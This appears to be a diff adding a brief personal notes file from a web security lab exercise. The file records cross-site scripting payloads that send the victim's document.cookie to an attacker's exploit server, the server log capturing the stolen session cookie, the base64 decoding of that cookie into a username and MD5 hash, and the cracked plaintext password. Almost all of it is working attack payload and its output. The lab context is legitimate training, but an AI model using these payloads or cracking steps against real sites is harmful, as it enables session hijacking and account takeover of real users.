@@ -1,0 +1,21 @@
+log
+
+https://exploit-0a950012047ef5d980d3e84101ac0072.exploit-server.net/exploit
+
+<script>document.location='//exploit-0a950012047ef5d980d3e84101ac0072.exploit-server.net/'+document.cookie</script>
+
+-------------- 2nd try
+<script>document.location='https://exploit-0a7c00dc03e7c85a8229875f013700e4.exploit-server.net/exploit'+document.cookie</script>
+
+success!! ---> 10.0.3.200      2024-06-28 02:06:09 +0000 "GET /exploitsecret=JhMp6QqR7l4bU1REVgjcT3kYZ5tiEJhL;
+            %20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz 
+            HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+
+Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz ---> base64
+
+    carlos:26323c16d5f4dabff3bb136f2460a943
+
+    26323c16d5f4dabff3bb136f2460a943 ---> md5
+
+        onceuponatime
